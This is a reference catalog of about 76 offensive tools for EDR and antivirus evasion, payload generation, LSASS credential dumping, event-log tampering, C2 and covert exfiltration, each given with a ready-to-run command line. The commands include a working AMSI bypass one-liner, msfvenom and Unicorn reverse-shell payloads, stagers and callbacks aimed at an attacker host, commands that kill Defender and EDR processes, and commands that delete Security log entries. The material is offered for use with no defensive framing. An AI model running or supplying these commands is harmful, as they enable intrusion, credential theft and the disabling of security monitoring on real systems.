# EDR Evasion & Payload Generation
> Source: HackTools | Entries: 76 | Platform: cross_platform


## Index

- [c2_framework](#c2framework)
- [credential_dumping](#credentialdumping)
- [data_exfiltration](#dataexfiltration)
- [edr_evasion](#edrevasion)
- [Evasion](#evasion)
- [iOS Sideloading](#ios-sideloading)
- [macos_security](#macossecurity)
- [payload_generation](#payloadgeneration)
- [Post-Exploitation](#post-exploitation)
- [steganography](#steganography)


### c2_framework

#### Brute Ratel C4
Commercial adversary simulation framework marketed as EDR-evasive. Uses 'Badger' implants with advanced evasion: indi...
**Categories:** c2_framework, adversary_simulation, red_team, edr_evasion
```
brc4 --generate-payload --listener https --format shellcode --arch x64
```

#### Nighthawk
Commercial C2 framework by MDSec with advanced evasion capabilities. Uses indirect syscalls, dynamic API resolution,...
**Categories:** c2_framework, adversary_simulation, edr_evasion, commercial_c2
```
nighthawk> inject-shellcode <pid> /path/to/shellcode.bin
```

#### Ninja C2
C2 framework focused on stealth operations with multiple evasion techniques. Supports HTTP/HTTPS/DNS C2 channels. Fea...
**Categories:** c2_framework, stealth, red_team, evasion
```
ninja_server --listener https --port 443 --domain c2.example.com
```

#### Villain
Lightweight C2 framework generating backdoors that bypass Windows Defender and other AV. Supports Windows (PowerShell...
**Categories:** c2_framework, reverse_shell, av_evasion, lightweight_c2
```
python3 Villain.py -p 8080
```

### credential_dumping

#### HandleKatz
LSASS credential dumper that clones an existing handle to LSASS rather than opening a new one. Leverages handles alre...
**Categories:** credential_dumping, lsass_access, handle_manipulation, edr_evasion
```
HandleKatz.exe --pid:lsass_pid --outfile:C:\Temp\dump.bin
```

#### Nanodump
LSASS process memory dumper that uses syscalls and multiple evasion techniques to create a minidump of LSASS while av...
**Categories:** credential_dumping, lsass_access, edr_evasion, syscall_abuse
```
nanodump.exe --write C:\Temp\out.dmp
```

### data_exfiltration

#### Cloakify
Data exfiltration and steganography tool that transforms binary data into lists of seemingly innocuous strings using...
**Categories:** data_exfiltration, steganography, data_encoding, dlp_evasion
```
python3 cloakify.py secret.zip ciphers/pokemonNames.ciph > exfil.txt
```

#### PacketWhisper
Stealthy data exfiltration tool that uses DNS queries to transmit data by encoding information into DNS lookups for r...
**Categories:** data_exfiltration, dns_tunneling, covert_channel, steganography
```
python3 packetWhisper.py
```

### edr_evasion

#### Backstab
EDR evasion tool that kills protected processes by leveraging a signed driver to terminate endpoint security product...
**Categories:** edr_evasion, defense_evasion, driver_abuse, process_termination
```
Backstab.exe -n MsMpEng.exe -k
```

#### Blindside
EDR evasion technique that leverages hardware breakpoints and vectored exception handlers to load a clean copy of ntd...
**Categories:** edr_evasion, api_unhooking, debug_abuse, defense_evasion
```
Blindside.exe --payload shellcode.bin
```

#### EDRSandblast
Comprehensive EDR evasion tool that removes kernel callbacks, patches ETW providers, and unhooks userland API hooks p...
**Categories:** edr_evasion, kernel_manipulation, etw_patching, callback_removal
```
EDRSandblast.exe --usermode
```

#### EDRSilencer
Tool that silences EDR telemetry by blocking outbound network communications from EDR agents using Windows Filtering...
**Categories:** edr_evasion, network_filtering, defense_evasion, telemetry_blocking
```
EDRSilencer.exe blockedr
```

#### EventCleaner
Windows Event Log manipulation tool that selectively deletes or modifies specific event log entries to remove evidenc...
**Categories:** edr_evasion, log_tampering, anti_forensics, defense_evasion
```
EventCleaner.exe --log Security --eventid 4624 --remove
```

#### FireWalker
EDR evasion library that uses hardware breakpoints and vectored exception handlers to bypass userland hooks by steppi...
**Categories:** edr_evasion, api_unhooking, hardware_breakpoints, defense_evasion
```
FireWalker.exe --demo NtCreateFile
```

#### Invoke-Phant0m
PowerShell implementation of the Phant0m technique that kills Windows Event Log service threads via PowerShell script...
**Categories:** edr_evasion, log_tampering, powershell_abuse, fileless_attack
```
Import-Module .\Invoke-Phant0m.ps1; Invoke-Phant0m
```

#### KillDefender
Tool specifically designed to disable Windows Defender by manipulating its service configuration, token privileges, a...
**Categories:** edr_evasion, defense_evasion, av_disable, windows_defender
```
KillDefender.exe
```

#### LogServiceCrash
Tool that crashes or disrupts the Windows Event Log service by exploiting vulnerabilities or resource exhaustion, pre...
**Categories:** edr_evasion, log_tampering, denial_of_service, defense_evasion
```
LogServiceCrash.exe
```

#### Phant0m
Windows Event Log killer that terminates Event Log service threads without stopping the service itself, effectively p...
**Categories:** edr_evasion, log_tampering, defense_evasion, anti_forensics
```
Phant0m.exe
```

#### PPLBlade
Protected Process Light (PPL) exploitation tool that bypasses Windows process protection to dump or manipulate protec...
**Categories:** edr_evasion, credential_dumping, ppl_bypass, defense_evasion
```
PPLBlade.exe --mode dump --name lsass.exe --output lsass.dmp
```

#### Sandman
Backdoor that uses NTP (Network Time Protocol) for covert command-and-control communications, hiding C2 traffic withi...
**Categories:** edr_evasion, covert_channel, command_and_control, protocol_abuse
```
Sandman.exe --server attacker.com --port 123
```

#### SharpEvtMute
C# tool that hooks the Windows Event Log service to mute specific event log entries in real-time, allowing attackers...
**Categories:** edr_evasion, log_tampering, process_injection, defense_evasion
```
SharpEvtMute.exe --Filter "EventID=4688"
```

#### Terminator
BYOVD (Bring Your Own Vulnerable Driver) tool that terminates EDR/AV processes by exploiting a vulnerable Zemana anti...
**Categories:** edr_evasion, byovd, driver_abuse, process_termination
```
Terminator.exe
```

#### unhook-bof
Cobalt Strike Beacon Object File (BOF) that refreshes ntdll.dll in memory to remove EDR userland hooks, restoring ori...
**Categories:** edr_evasion, api_unhooking, cobalt_strike, defense_evasion
```
beacon> unhook
```

### Evasion

#### AceLdr
Cobalt Strike UDRL (User-Defined Reflective Loader) implementing position-independent reflective loading with Cobalt...
**Categories:** Evasion
```
Load AceLdr.cna in Cobalt Strike Script Manager
```

#### Alcatraz
Binary obfuscator for x64 PE and ELF executables. Applies control flow flattening, junk code insertion, and anti-disa...
**Categories:** Evasion
```
alcatraz -i payload.exe -o obfuscated.exe
```

#### AMSI Bypass Techniques
Collection of techniques for bypassing the Windows Antimalware Scan Interface (AMSI) including memory patching, refle...
**Categories:** Evasion
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### BokuLoader
Cobalt Strike User-Defined Reflective Loader (UDRL) that implements advanced evasion techniques including syscall-bas...
**Categories:** Evasion
```
Set BokuLoader as UDRL in Cobalt Strike Malleable C2 profile
```

#### Chameleon
PowerShell script obfuscator specifically designed to bypass AMSI and endpoint detection by transforming known-malici...
**Categories:** Evasion
```
python3 chameleon.py -f mimikatz.ps1 -o output.ps1
```

#### Charlotte
C++ shellcode launcher using Windows Fiber API for execution and XOR encryption for payload obfuscation. Uses callbac...
**Categories:** Evasion
```
charlotte.exe (with embedded encrypted shellcode)
```

#### ConfuserEx
Open-source .NET assembly obfuscator that applies protection techniques including anti-tampering, control flow obfusc...
**Categories:** Evasion
```
Confuser.CLI.exe project.crproj
```

#### Donut
Generates position-independent shellcode from .NET assemblies, PE executables, and VBScript/JScript files. Enables in...
**Categories:** Evasion
```
donut -i payload.exe -o loader.bin
```

#### Donut-Decoy
Extension of the Donut shellcode framework that adds decoy document functionality, displaying a legitimate document t...
**Categories:** Evasion
```
donut-decoy -i beacon.bin -d invoice.pdf -o loader.exe
```

#### ETW Patching Tools
Techniques and tools for patching Event Tracing for Windows (ETW) to blind defensive telemetry. Targets EtwEventWrite...
**Categories:** Evasion
```
Patch EtwEventWrite: VirtualProtect + write C3 (RET) to function entry
```

#### Freeze
Payload creation tool that suspends threads to evade EDR detection. Creates shellcode loaders that use suspended proc...
**Categories:** Evasion
```
freeze -I beacon.bin -O loader.exe
```

#### HalosGate
Evolution of HellsGate that handles hooked ntdll stubs by looking at neighboring syscall stubs to calculate the targe...
**Categories:** Evasion
```
Compile HalosGate implementation into C/C++ project
```

#### HellsGate
Direct syscall technique that dynamically resolves syscall numbers at runtime by reading the SSN from ntdll.dll sysca...
**Categories:** Evasion
```
Compile HellsGate.c with custom NT API calls
```

#### Inceptor
Modern payload generation and obfuscation framework combining template-based PE/shellcode packing with multiple evasi...
**Categories:** Evasion
```
inceptor -t dotnet -e aes -a steal -o packed.exe beacon.bin
```

#### Invoke-Obfuscation
PowerShell script obfuscation framework that applies multiple obfuscation layers to PowerShell commands and scripts,...
**Categories:** Evasion
```
Invoke-Obfuscation -ScriptBlock {Get-Process} -Quiet -ObfuscationType TOKEN
```

#### Invoke-Stealth
PowerShell script obfuscation tool focused on AMSI and logging bypass. Applies targeted obfuscation to evade Windows...
**Categories:** Evasion
```
Invoke-Stealth -Script payload.ps1 -Technique ALL
```

#### Mangle
Payload manipulation tool that modifies PE file properties, strips known-bad indicators, and manipulates metadata to...
**Categories:** Evasion
```
mangle -i payload.exe -o mangled.exe -C C:\Windows\System32\svchost.exe
```

#### NimHollow
Nim-based process hollowing tool that creates a suspended process, unmaps its memory, and replaces it with shellcode....
**Categories:** Evasion
```
NimHollow.exe -t svchost.exe -s beacon.bin
```

#### NimPackt
Nim-based packer and shellcode loader generator that wraps .NET assemblies and shellcode into Nim executables with ev...
**Categories:** Evasion
```
python3 NimPackt.py -e exe -i SharpTool.exe -o packed.exe
```

#### PEzor
Open-source PE packer and shellcode loader that applies multiple evasion techniques including syscalls, unhooking, AM...
**Categories:** Evasion
```
PEzor.sh -format=exe -syscalls -unhook -antidebug -text beacon.bin -o loader.exe
```

#### Phantom-Evasion
Antivirus evasion tool that generates payloads using polymorphic code, process injection, and multiple encoding techn...
**Categories:** Evasion
```
python3 phantom-evasion.py
```

#### ScareCrow
Payload creation framework that generates shellcode loaders using EDR evasion techniques including direct syscalls, u...
**Categories:** Evasion
```
ScareCrow -I beacon.bin -Loader dll -domain www.microsoft.com
```

#### SharpUnhooker
C# tool that removes EDR/AV user-mode API hooks from ntdll.dll by replacing the hooked copy with a clean version load...
**Categories:** Evasion
```
SharpUnhooker.exe
```

#### ShellcodeLoader
Generic shellcode loading framework implementing multiple execution and injection techniques for running arbitrary sh...
**Categories:** Evasion
```
ShellcodeLoader.exe -f beacon.bin -t createthread
```

#### SysWhispers
Header/ASM file generator that produces direct system call stubs for Windows NT API functions, enabling userland API...
**Categories:** Evasion
```
python3 syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls
```

#### SysWhispers2
Evolution of SysWhispers using runtime syscall number resolution via EAT parsing instead of hardcoded values. Sorts Z...
**Categories:** Evasion
```
python3 syswhispers.py -f NtAllocateVirtualMemory,NtProtectVirtualMemory -o sw2
```

#### SysWhispers3
Third generation of SysWhispers adding indirect syscall support, egg-hunting for syscall instruction addresses, and i...
**Categories:** Evasion
```
python3 syswhispers.py -f NtAllocateVirtualMemory -o sw3 --sw-output indirect_randomized
```

#### TartarusGate
Further evolution of HellsGate/HalosGate that handles multiple hook types including two-byte and multi-byte hooks by...
**Categories:** Evasion
```
Compile TartarusGate.c into payload project
```

#### ThreadlessInject
Process injection technique that avoids creating remote threads by hijacking existing thread execution through functi...
**Categories:** Evasion
```
ThreadlessInject.exe -p explorer.exe -d ntdll.dll -e RtlUserThreadStart -s beacon.bin
```

#### Veil
Payload generation framework designed to bypass antivirus detection. Generates payloads in multiple languages (Python...
**Categories:** Evasion
```
veil -t Evasion -p python/meterpreter/rev_tcp --ip 10.0.0.1 --port 443
```

### iOS Sideloading

#### Cydia Impactor
GUI tool for sideloading IPA files onto iOS devices and APK files onto Android devices using Apple developer credenti...
**Categories:** iOS Sideloading, Mobile Security, Application Deployment, Code Signing, Device Management
```
impactor target.ipa
```

### macos_security

#### Mystikal
macOS post-exploitation tool that leverages Apple's proprietary system frameworks and APIs for payload generation, pe...
**Categories:** macos_security, post_exploitation, persistence, privilege_escalation, payload_generation
```
python3 mystikal.py --payload launchagent --callback attacker.com:443
```

### payload_generation

#### Amber
Reflective PE packer that converts PE files into position-independent shellcode using reflective loading techniques,...
**Categories:** payload_generation, pe_packing, reflective_loading, in_memory_execution
```
amber -f payload.exe -o packed_payload.exe
```

#### CACTUSTORCH
Payload generation tool that leverages the DotNetToJScript technique to execute .NET assemblies in memory through var...
**Categories:** payload_generation, dotnet_abuse, script_payloads, initial_access
```
CACTUSTORCH.hta (double-click execution)
```

#### Covenant Grunt
Covenant C2 framework implant generation capability that creates .NET-based agents (Grunts) with various communicatio...
**Categories:** payload_generation, command_and_control, implant_framework, dotnet_abuse
```
Covenant > Launchers > PowerShell > Generate
```

#### DotNetToJScript
Tool that generates JavaScript, VBScript, or VBA code capable of loading and executing .NET assemblies in memory with...
**Categories:** payload_generation, dotnet_abuse, script_payloads, fileless_execution
```
DotNetToJScript.exe -l JScript -o payload.js -c ShellcodeRunner assembly.dll
```

#### EvilClippy
Cross-platform tool for manipulating Office documents at the binary level, capable of hiding VBA macros, stomping p-c...
**Categories:** payload_generation, macro_obfuscation, document_manipulation, defense_evasion
```
EvilClippy.exe -s fake_macro.vba malicious.docm
```

#### GadgetToJScript
Evolution of DotNetToJScript that generates script payloads using .NET deserialization gadgets instead of BinaryForma...
**Categories:** payload_generation, dotnet_abuse, deserialization, script_payloads
```
GadgetToJScript.exe -a assembly.dll -o payload.js -w js
```

#### Ivy
Payload creation framework that generates undetected payloads using direct syscalls, function unhooking, and encrypte...
**Categories:** payload_generation, syscall_abuse, shellcode_loader, process_injection
```
Ivy.exe -Inject -Process notepad.exe -Payload shellcode.bin
```

#### LuckyStrike
PowerShell-based tool for generating malicious Office macro documents with multiple payload options, providing a menu...
**Categories:** payload_generation, macro_weaponization, initial_access, phishing
```
Import-Module .\LuckyStrike.ps1; Invoke-LuckyStrike
```

#### Macro_Pack
Office document weaponization framework that automates creation of malicious macro-enabled documents, VBA payloads, a...
**Categories:** payload_generation, macro_weaponization, initial_access, phishing
```
macro_pack.exe -t SHELLCODE -o -G payload.docm
```

#### msfvenom
Metasploit Framework payload generator and encoder that creates weaponized payloads in multiple formats for various p...
**Categories:** payload_generation, shellcode, exploit_framework, penetration_testing
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe
```

#### PowerDrop
PowerShell-based post-exploitation dropper that uses WMI event subscriptions and PowerShell for persistent payload de...
**Categories:** payload_generation, persistence, wmi_abuse, powershell_abuse
```
powershell -ep bypass -f PowerDrop.ps1
```

#### SharpShooter
Payload generation framework that creates weaponized documents and script-based payloads using various Windows script...
**Categories:** payload_generation, initial_access, script_payloads, html_smuggling
```
python SharpShooter.py --stageless --dotnetver 4 --payload js --output payload --rawscfile shellcode.bin
```

#### Shellter
Dynamic PE infector that injects shellcode into legitimate Windows executables by hijacking execution flow, creating...
**Categories:** payload_generation, pe_injection, av_evasion, trojanization
```
shellter -a --payload custom -f payload.exe --stealth
```

#### Stager
Open-source payload staging framework that generates lightweight first-stage payloads designed to download and execut...
**Categories:** payload_generation, staging, payload_delivery, initial_access
```
python stager.py --generate --type exe --url https://attacker.com/stage2 --output stager.exe
```

#### Unicorn
PowerShell downgrade and shellcode injection tool that generates various payload formats using PowerShell, macro, HTA...
**Categories:** payload_generation, powershell_abuse, shellcode_injection, initial_access
```
python unicorn.py windows/meterpreter/reverse_tcp 10.0.0.1 4444
```

### Post-Exploitation

#### BOF.NET
Framework enabling .NET assemblies to run as Cobalt Strike Beacon Object Files (BOFs). Allows execution of C# tooling...
**Categories:** Post-Exploitation, Evasion
```
bofnet_init
```

#### SharpEventLog
C# tool for Windows Event Log manipulation including log clearing, specific event deletion, and log source tampering...
**Categories:** Post-Exploitation, Evasion
```
SharpEventLog.exe -c Security
```

### steganography

#### OpenStego
Java-based steganography application providing data hiding within images and digital watermarking capabilities, suppo...
**Categories:** steganography, data_exfiltration, image_manipulation, data_hiding
```
java -jar openstego.jar embed -mf secret.txt -cf cover.png -sf stego.png -p password
```

#### snow
Whitespace steganography tool that hides messages by appending invisible whitespace characters (spaces and tabs) to t...
**Categories:** steganography, data_exfiltration, whitespace_encoding, covert_channel
```
snow -C -m "secret message" -p password infile.txt outfile.txt
```

#### steghide
Steganography tool that embeds and extracts hidden data within JPEG, BMP, WAV, and AU files using a passphrase-based...
**Categories:** steganography, data_exfiltration, data_hiding, covert_channel
```
steghide embed -cf photo.jpg -ef secret.txt -p password123
```

#### StegoSuite
Java-based steganography tool with GUI support for embedding and extracting hidden data in BMP, GIF, and JPG image fi...
**Categories:** steganography, data_exfiltration, image_manipulation, data_hiding
```
java -jar stegosuite.jar
```
